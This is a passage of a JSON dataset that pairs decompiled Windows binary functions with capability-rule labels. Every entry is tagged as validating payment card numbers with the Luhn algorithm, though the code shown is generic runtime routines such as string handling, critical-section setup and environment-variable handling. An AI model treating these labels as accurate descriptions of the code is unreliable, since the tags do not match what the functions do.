        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00404dfe(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t in_ECX;\n    uint32_t in_stack_ffffffd0;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_bp_ch;\n    \n    var_14h = *(in_ECX + 0x10);\n    if (*(in_ECX + 0x14) - var_14h < arg_8h) {\n        var_bp_ch = fcn.00401f19(arg_8h, in_stack_ffffffd0 & 0xffffff00 | var_1ch, arg_8h, arg_ch);\n    }\n    else {\n        *(in_ECX + 0x10) = var_14h + arg_8h;\n        var_18h = fcn.00406087();\n        fcn.0040146f(var_18h + var_14h, arg_8h, arg_ch);\n        var_1ch._3_1_ = 0;\n        fcn.00405e0c(var_18h + var_14h + arg_8h, &var_1ch + 3);\n        var_bp_ch = in_ECX;\n    }\n    return var_bp_ch;\n}\n",
        "token_count": 316
    },
    "00404e3f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404e3f(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int16_t *piVar5;\n    \n    piVar5 = arg_8h;\n    do {\n        iVar1 = *piVar5;\n        piVar5 = piVar5 + 1;\n    } while (iVar1 != 0);\n    iVar4 = (piVar5 - (arg_8h + 1) >> 1) + 1;\n    iVar3 = fcn.004033dc(iVar4, 2);\n    if (iVar3 != 0) {\n        fcn.00405830(iVar3, arg_8h, iVar4 * 2);\n        return iVar3;\n    }\n    fcn.00401096();\n    pcVar2 = swi(3);\n    iVar4 = (*pcVar2)();\n    return iVar4;\n}\n",
        "token_count": 221
    },
    "00404e67": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404e67(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_ch;\n    uchar var_5h;\n    uint var_4h;\n    \n    var_5h = 0;\n    iVar1 = fcn.00406087();\n    *(in_ECX + 0x10) = arg_8h;\n    fcn.00405e0c(iVar1 + arg_8h, &var_5h);\n    return;\n}\n",
        "token_count": 120
    },
    "00404e71": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404e71(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00405ab0(arg_8h);\n    if (in_ECX != iVar1) {\n        fcn.004041ec(arg_8h);\n    }\n    return in_ECX;\n}\n",
        "token_count": 103
    },
    "00404ea3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404ea3(uint arg_8h)\n\n{\n    uint var_4h;\n    \n    return arg_8h;\n}\n",
        "token_count": 34
    },
    "00404ed0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404ed0(uint lpCriticalSection, uint dwSpinCount, uint arg_10h)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.004ca267(0x12, \"InitializeCriticalSectionEx\", 0x5597c0, 0x5597c8);\n    if (pcVar1 == NULL) {\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSectionAndSpinCount)(lpCriticalSection, dwSpinCount);\n    }\n    else {\n        (**0x578000)(lpCriticalSection, dwSpinCount, arg_10h);\n        (*pcVar1)();\n    }\n    return;\n}\n",
        "token_count": 141
    },
    "00404f07": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00404f07(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_1h;\n    \n    fcn.004bc4be(arg_8h, arg_ch, &var_1h, arg_10h);\n    return;\n}\n",
        "token_count": 83
    },
    "00404f61": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404f61(code *arg_8h)\n\n{\n    code **in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004016e0();\n    *in_ECX = vtable.std::locale::facet.0;\n    in_ECX[1] = arg_8h;\n    return;\n}\n",
        "token_count": 83
    },
    "00404fca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404fca(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.004ca02f();\n    if (pcVar1 == NULL) {\n        fcn.00402860(arg_8h, arg_ch, arg_10h);\n    }\n    else {\n        (**0x578000)(arg_8h, arg_ch, arg_10h, arg_14h);\n        (*pcVar1)();\n    }\n    return;\n}\n",
        "token_count": 127
    },
    "00404fe3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00404fe3(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = 0x553150;\n    do {\n        if (*piVar1 == arg_8h) {\n            return piVar1[1];\n        }\n        piVar1 = piVar1 + 2;\n    } while (piVar1 != 0x5533c0);\n    return \"unknown error\";\n}\n",
        "token_count": 103
    },
    "00404ff7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404ff7(void)\n\n{\n    uint var_4h;\n    \n    return;\n}\n",
        "token_count": 24
    },
    "00405015": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00405015(uint arg_8h, uint noname_1, uint arg_10h)\n\n{\n    ushort extraout_var;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    var_8h = 0;\n    var_4h._0_2_ = 0;\n    fcn.00403d7d(&var_4h, &arg_8h, 1, &var_ch, arg_10h);\n    return CONCAT22(extraout_var, var_4h);\n}\n",
        "token_count": 142
    },
    "0040504c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040504c(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.00403977(arg_8h, arg_ch, arg_10h);\n    if (iVar2 == 0) {\n        if (*(arg_10h + 0x80) != 0) {\n            fcn.00405ede(arg_8h, arg_ch, 2);\n        }\n        if (*(arg_10h + 0x100) != 0) {\n            fcn.00405ede(arg_8h, arg_ch, 2);\n        }\n        return;\n    }\n    fcn.0040366b(0, 0, 0, 0, 0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 202
    },
    "00405137": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nuint __cdecl fcn.00405137(uint arg_8h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00403b02(&stack0x0000001c);\n    fcn.00403b02();\n    return 0x17113;\n}\n",
        "token_count": 83
    },
    "00405173": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00405173(uint *arg_8h, uint *arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint *puVar1;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    if ((arg_ch == NULL) && (arg_10h != 0)) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n    }\n    else {\n        var_10h = 0xffffffff;\n        if (arg_ch == NULL) {\n            arg_10h = 5;\n            arg_ch = &var_ch;\n        }\n        fcn.004de5b6(&var_10h, arg_ch, arg_10h, arg_14h, arg_18h, 0);\n        if (arg_8h != NULL) {\n            *arg_8h = var_10h;\n        }\n    }\n    fcn.004030bc(var_10h);\n    return;\n}\n",
        "token_count": 280
    },
    "004051a5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.004051a5(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_1h;\n    \n    fcn.004bc59c(arg_8h, arg_ch, &var_1h, arg_10h);\n    return;\n}\n",
        "token_count": 83
    },
    "0040523b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040523b(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    puVar2 = *(in_ECX + 0x34);\n    if (0 < arg_8h) {\n        do {\n            if (*puVar2 == 0) {\n                return iVar3;\n            }\n            iVar1 = fcn.00406203(***(in_ECX + 8), *puVar2, 0x8000);\n            if (iVar1 != 0) {\n                puVar2 = puVar2 + 1;\n            }\n            puVar2 = puVar2 + 1;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < arg_8h);\n    }\n    return iVar3;\n}\n",
        "token_count": 204
    },
    "0040528b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040528b(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar4 = arg_8h + 7U & 0xfffffff8;\n    if (uVar4 == 0) {\n        uVar4 = 8;\n    }\n    uVar3 = *(in_ECX + 0x10);\n    if (uVar3 < uVar4) {\n        uVar3 = 0x1000;\n        if (uVar4 < 0x1001) {\n            puVar1 = fcn.0040371f(0x1004, 0x574474, 1);\n            if (puVar1 != NULL) {\n                *puVar1 = 0;\n                if (*(in_ECX + 0xc) == NULL) {\n                    *(in_ECX + 8) = puVar1;\n                }\n                else {\n                    **(in_ECX + 0xc) = puVar1;\n                }\n                *(in_ECX + 0xc) = puVar1;\n                goto code_r0x0049004e;\n            }\n        }\n        iVar2 = 0;\n    }\n    else {\ncode_r0x0049004e:\n        *(in_ECX + 0x10) = uVar3 - uVar4;\n        iVar2 = *(in_ECX + 0xc) + 4 + (uVar3 - uVar4);\n    }\n    return iVar2;\n}\n",
        "token_count": 357
    },
    "004052c7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.004052c7(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00401e06(param_1);\n    return;\n}\n",
        "token_count": 57
    },
    "0040533a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040533a(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = arg_8h + -1;\n    return (iVar1 + (iVar1 >> 0x1f & 3U) >> 2) + -0x11 + ((arg_8h + 299) / 400 - iVar1 / 100);\n}\n",
        "token_count": 92
    },
    "00405353": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405353(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    \n    arg_8h = param_1 + 0x28;\n    if (*(param_1 + 0x32) != 0x2a) {\n        uVar2 = fcn.00401bcc(arg_8h);\n        return uVar2;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar1 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar1;\n    if (iVar1 < 0) {\n        *arg_8h = -1;\n    }\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 193
    },
    "0040535d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __fastcall fcn.0040535d(uint param_1)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00405baf(param_1);\n    fcn.00406564();\n    return;\n}\n",
        "token_count": 72
    },
    "00405367": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405367(int32_t *param_1)\n\n{\n    uint var_4h;\n    \n    (**(*param_1 + 0x34))();\n    return;\n}\n",
        "token_count": 44
    },
    "004053fd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004053fd(uint hModule, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uchar var_211h;\n    uint lpFilename;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(hModule, &lpFilename, 0x105);\n    if (iVar1 == 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        fcn.00404b9c(uVar2);\n    }\n    else {\n        var_21ch = 0;\n        var_22ch = arg_ch;\n        var_228h = arg_10h;\n        var_224h = arg_ch;\n        var_220h = arg_10h;\n        var_218h._0_1_ = 0;\n        uVar2 = fcn.00403b9d();\n        fcn.004c79a9(&lpFilename, &var_22ch, &var_211h, uVar2);\n    }\n    fcn.004030bc(hModule);\n    return;\n}\n",
        "token_count": 326
    },
    "00405457": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00405457(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00401ac8(param_1);\n    return;\n}\n",
        "token_count": 56
    },
    "004054bb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004054bb(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t arg_10h_00;\n    uint32_t arg_ch_00;\n    uint arg_ch_01;\n    code *pcVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint *in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h_00 = in_ECX[4];\n    if (arg_8h <= 0x7ffffffeU - arg_10h_00) {\n        arg_ch_00 = in_ECX[5];\n        iVar2 = fcn.00401e29(arg_10h_00 + arg_8h, arg_ch_00, 0x7ffffffe);\n        arg_8h_00 = fcn.004037e2(iVar2 + 1);\n        in_ECX[4] = arg_10h_00 + arg_8h;\n        in_ECX[5] = iVar2;\n        if (arg_ch_00 < 8) {\n            fcn.00401073(arg_8h_00, in_ECX, arg_10h_00, arg_10h, arg_14h);\n        }\n        else {\n            arg_ch_01 = *in_ECX;\n            fcn.00401073(arg_8h_00, arg_ch_01, arg_10h_00, arg_10h, arg_14h);\n            fcn.00401654(arg_ch_01, arg_ch_00 * 2 + 2);\n        }\n        *in_ECX = arg_8h_00;\n        return;\n    }\n    fcn.0040393b();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 421
    },
    "00405551": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00405551(uint arg_8h, uint noname_1, uint arg_10h)\n\n{\n    ushort extraout_var;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    var_8h = 0;\n    var_4h._0_2_ = 0;\n    fcn.00403d7d(&var_4h, &arg_8h, 1, &var_ch, arg_10h);\n    return CONCAT22(extraout_var, var_4h);\n}\n",
        "token_count": 142
    },
    "0040557e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0040557e(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    var_8h = 0;\n    uVar1 = fcn.00403d7d(&var_4h, &arg_8h, 1, &var_ch, in_ECX + 0x18);\n    if (uVar1 < 0) {\n        uVar1 = 0xffff;\n    }\n    else {\n        uVar1 = uVar1 & 0xffff0000 | var_4h;\n    }\n    return uVar1;\n}\n",
        "token_count": 177
    },
    "004055b5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004055b5(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint var_10h;\n    uint var_ch;\n    \n    uVar1 = fcn.00403a99(arg_8h, arg_ch, arg_10h, 0, &arg_14h);\n    return uVar1;\n}\n",
        "token_count": 94
    },
    "004055c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004055c4(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch)\n\n{\n    fcn.00405830(arg_8h, arg_ch, arg_14h * 2);\n    fcn.00404ce1(arg_14h * 2 + arg_8h, arg_1ch, arg_18h);\n    fcn.00405830(arg_8h + (arg_14h + arg_18h) * 2, arg_ch + arg_14h * 2, (arg_10h - arg_14h) * 2 + 2);\n    return;\n}\n",
        "token_count": 170
    },
    "00405623": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00405623(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00401a05(param_1);\n    return;\n}\n",
        "token_count": 56
    },
    "00405628": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405628(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.00401794(arg_8h, 0xffffffff, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 66
    },
    "00405637": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405637(uint16_t *arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    if (arg_10h != 0) {\n        for (; ((arg_10h = arg_10h + -1,  arg_10h != 0 && (*arg_8h != 0)) && (*arg_8h == *arg_ch)); arg_8h = arg_8h + 1)\n        {\n            arg_ch = arg_ch + 1;\n        }\n        return *arg_8h - *arg_ch;\n    }\n    return arg_10h;\n}\n",
        "token_count": 144
    },
    "00405650": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405650(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.0040213f(arg_8h, arg_8h + 0x38, &arg_ch);\n    return iVar1 - arg_8h >> 1;\n}\n",
        "token_count": 84
    },
    "00405682": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00405682(uint8_t *arg_8h, uint8_t **arg_ch, uint arg_10h, uint *arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint8_t uVar4;\n    uint8_t *arg_8h_00;\n    uint var_4h;\n    \n    if (arg_ch == NULL) {\n        arg_ch = &var_4h;\n    }\n    uVar4 = *arg_8h;\n    arg_8h_00 = arg_8h;\n    while (iVar1 = fcn.00405d9e(uVar4),  iVar1 != 0) {\n        arg_8h_00 = arg_8h_00 + 1;\n        uVar4 = *arg_8h_00;\n    }\n    uVar4 = *arg_8h_00;\n    if ((uVar4 == 0x2d) || (uVar4 == 0x2b)) {\n        arg_8h_00 = arg_8h_00 + 1;\n    }\n    else {\n        uVar4 = 0x2b;\n    }\n    uVar2 = fcn.004042c3(arg_8h_00, arg_ch, arg_10h, arg_14h);\n    if (arg_8h_00 == *arg_ch) {\n        *arg_ch = arg_8h;\ncode_r0x004840d6:\n        if (uVar2 != 0) goto code_r0x004840f2;\n    }\n    else if (arg_8h == *arg_ch) goto code_r0x004840d6;\n    if ((uVar4 != 0x2b) || (uVar2 < 0x80000000)) {\n        if (uVar4 != 0x2d) {\n            return uVar2;\n        }\n        if (uVar2 < 0x80000001) {\n            return -uVar2;\n        }\n    }\ncode_r0x004840f2:\n    puVar3 = fcn.00403a35();\n    *puVar3 = 0x22;\n    if (arg_14h != NULL) {\n        *arg_14h = 1;\n    }\n    return (uVar4 == 0x2d) + 0x7fffffff;\n}\n",
        "token_count": 534
    },
    "0040569b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040569b(uint param_1, uint param_2, ulong param_3, ulong param_4, uint param_5)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint arg_8h;\n    uint in_stack_ffffff68;\n    uchar auStack144 [64];\n    uint32_t uStack80;\n    uint32_t uStack20;\n    \n    arg_8h = param_5;\n    uStack20 = *0x571ca8 ^ &stack0xfffffff0;\n    iVar2 = fcn.00402f6d(param_1, &param_4, param_5);\n    if (iVar2 == 0) {\n        uStack80 = uStack80 & 0xfffffffe;\n        fcn.004055b0(auStack144, &param_5, param_1, param_2, &param_3, &param_4, 0);\n        arg_8h = param_5;\n    }\n    iVar2 = fcn.0040559c(param_1);\n    cVar1 = fcn.00404903();\n    if ((cVar1 == '\\0') || (iVar2 == 0)) {\n        fcn.00403d8c(iVar2);\n        fcn.0040524f(arg_8h, 0xffff);\n    }\n    else {\n        fcn.004045de(iVar2, param_2, param_3, param_3 >> 0x20, 0, 0, param_4, param_4 >> 0x20, arg_8h);\n    }\n    fcn.004030bc(in_stack_ffffff68);\n    return;\n}\n",
        "token_count": 369
    },
    "004056be": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004056be(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    (**(*in_ECX + 0x1c))(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 72
    },
    "004056f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.004056f0(char *arg_8h, int32_t arg_ch)\n\n{\n    uint32_t arg_ch_00;\n    char cVar1;\n    char cVar2;\n    code *pcVar3;\n    uint *puVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    int32_t iVar8;\n    uint uVar9;\n    char *pcVar10;\n    char *pcVar11;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (arg_8h == NULL) {\n        puVar4 = fcn.00403a35();\n        *puVar4 = 0x16;\n        return 0xffffffff;\n    }\n    pcVar5 = fcn.00401f91(arg_8h, 0x3d);\n    pcVar11 = arg_8h;\n    if ((pcVar5 == NULL) || (pcVar5 == arg_8h)) {\ncode_r0x004c91d8:\n        puVar4 = fcn.00403a35();\n        *puVar4 = 0x16;\n        goto code_r0x004c91e3;\n    }\n    cVar1 = pcVar5[1];\n    fcn.004c973e();\n    uVar9 = 0;\n    if (*0x57488c == NULL) {\n        if ((arg_ch != 0) && (*0x574890 != 0)) {\n            iVar6 = fcn.00401159();\n            if (iVar6 == 0) goto code_r0x004c91d8;\n            fcn.004c973e();\n            goto code_r0x004c9095;\n        }\n        if (cVar1 == '\\0') {\n            uVar9 = 0;\n            goto code_r0x004c91e6;\n        }\n        *0x57488c = fcn.00405088(1, 4);\n        fcn.0040640b(0);\n        if (*0x57488c != NULL) {\n            if (*0x574890 == 0) {\n                *0x574890 = fcn.00405088(1, 4);\n                fcn.0040640b(0);\n                if (*0x574890 == 0) goto code_r0x004c91e3;\n            }\n            goto code_r0x004c9095;\n        }\n    }\n    else {\ncode_r0x004c9095:\n        piVar7 = *0x57488c;\n        if (*0x57488c != NULL) {\n            iVar6 = fcn.004c977e(arg_8h, pcVar5 - arg_8h);\n            if ((-1 < iVar6) && (*piVar7 != 0)) {\n                fcn.0040640b(piVar7[iVar6]);\n                if (cVar1 == '\\0') {\n                    for (; piVar7[iVar6] != 0; iVar6 = iVar6 + 1) {\n                        piVar7[iVar6] = piVar7[iVar6 + 1];\n                    }\n                    piVar7 = fcn.00402cfc(piVar7, iVar6, 4);\n                    fcn.0040640b(0);\n                    if (piVar7 != NULL) {\ncode_r0x004c915d:\n                        *0x57488c = piVar7;\n                    }\n                }\n                else {\n                    pcVar11 = NULL;\n                    piVar7[iVar6] = arg_8h;\n                }\n                if (arg_ch != 0) {\n                    pcVar10 = arg_8h;\n                    do {\n                        cVar2 = *pcVar10;\n                        pcVar10 = pcVar10 + 1;\n                    } while (cVar2 != '\\0');\n                    iVar6 = fcn.00405088(pcVar10 + (2 - (arg_8h + 1)), 1);\n                    if (iVar6 != 0) {\n                        iVar8 = fcn.0040605a(iVar6, pcVar10 + (2 - (arg_8h + 1)), arg_8h);\n                        if (iVar8 != 0) {\n                            fcn.0040366b(0, 0, 0, 0, 0);\n                            pcVar3 = swi(3);\n                            uVar9 = (*pcVar3)();\n                            return uVar9;\n                        }\n                        (pcVar5 + (iVar6 - arg_8h) + 1)[-1] = '\\0';\n                        iVar8 = fcn.0040542f(iVar6, -(cVar1 != '\\0') & pcVar5 + (iVar6 - arg_8h) + 1);\n                        if (iVar8 == 0) {\n                            puVar4 = fcn.00403a35();\n                            uVar9 = 0xffffffff;\n                            *puVar4 = 0x2a;\n                        }\n                    }\n                    fcn.0040640b(iVar6);\n                }\n                goto code_r0x004c91e6;\n            }\n            if (cVar1 == '\\0') goto code_r0x004c91e6;\n            arg_ch_00 = -iVar6 + 2;\n            if ((-iVar6 <= arg_ch_00) && (arg_ch_00 < 0x3fffffff)) {\n                piVar7 = fcn.00402cfc(piVar7, arg_ch_00, 4);\n                fcn.0040640b(0);\n                if (piVar7 != NULL) {\n                    piVar7[-iVar6] = arg_8h;\n                    piVar7[1 - iVar6] = 0;\n                    pcVar11 = NULL;\n                    goto code_r0x004c915d;\n                }\n            }\n        }\n    }\ncode_r0x004c91e3:\n    uVar9 = 0xffffffff;\ncode_r0x004c91e6:\n    fcn.0040640b(pcVar11);\n    return uVar9;\n}\n",
        "token_count": 1349
    },
    "00405790": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
